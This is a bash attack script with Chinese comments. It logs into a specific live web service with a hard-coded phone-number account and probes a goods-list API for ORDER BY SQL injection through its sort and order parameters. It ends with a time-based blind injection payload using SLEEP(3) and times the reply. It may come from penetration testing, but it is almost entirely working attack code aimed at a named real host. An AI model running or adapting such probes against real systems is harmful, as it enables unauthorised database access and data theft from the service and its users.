#!/bin/bash

TOKEN=$(curl -sk "http://longnows-gts.t.kkgroup.cn/pms/api/v1/pmsUser/login" -X POST \
  -H "Content-Type: application/json" \
  -d '{"account":"19129430218","password":"any"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['accessToken'])")

sign_request() {
  REQUEST_ID=$(uuidgen | tr '[:upper:]' '[:lower:]')
  TIMESTAMP=$(date +%s000)
  NONCE=$(echo -n "${REQUEST_ID}${TIMESTAMP}" | md5)
  echo "$REQUEST_ID|$TIMESTAMP|$NONCE"
}

echo "====== 更细粒度的ORDER BY注入测试 ======"

# 测试1: 无sort参数
echo ""
echo "--- 测试1: 无sort参数 ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoods/list" -X POST \
  -H "Content-Type: application/json;charset=UTF-8" \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -d '{}' | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'total={d.get(\"total\")}')"

# 测试2: sort=createTime (valid field)
echo ""
echo "--- 测试2: sort=createTime ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoods/list" -X POST \
  -H "Content-Type: application/json;charset=UTF-8" \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -d '{"sort":"createTime"}' | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'total={d.get(\"total\")}')"

# 测试3: sort=createTime DESC
echo ""
echo "--- 测试3: sort=createTime DESC ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoods/list" -X POST \
  -H "Content-Type: application/json;charset=UTF-8" \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -d '{"sort":"createTime DESC"}' | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'total={d.get(\"total\")}')"

# 测试4: 带page参数
echo ""
echo "--- 测试4: 带page参数 ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoods/list" -X POST \
  -H "Content-Type: application/json;charset=UTF-8" \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -d '{"page":1,"size":10}' | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'total={d.get(\"total\")}')"

# 测试5: order参数
echo ""
echo "--- 测试5: order=desc ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoods/list" -X POST \
  -H "Content-Type: application/json;charset=UTF-8" \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -d '{"sort":"createTime","order":"desc"}' | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'total={d.get(\"total\")}')"

# 测试6: order=desc with page
echo ""
echo "--- 测试6: sort+order+page ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoods/list" -X POST \
  -H "Content-Type: application/json;charset=UTF-8" \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -d '{"page":1,"size":10,"sort":"createTime","order":"desc"}' | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'total={d.get(\"total\")}')"

# 测试7: ORDER BY 注入时间盲注
echo ""
echo "--- 测试7: SLEEP时间盲注 ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
START_TIME=$(date +%s%N)
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoods/list" -X POST \
  -H "Content-Type: application/json;charset=UTF-8" \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -d '{"sort":"createTime AND SLEEP(3)","order":"desc","page":1,"size":10}' | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'total={d.get(\"total\")}')"
END_TIME=$(date +%s%N)
echo "耗时: $(( (END_TIME - START_TIME) / 1000000 ))ms"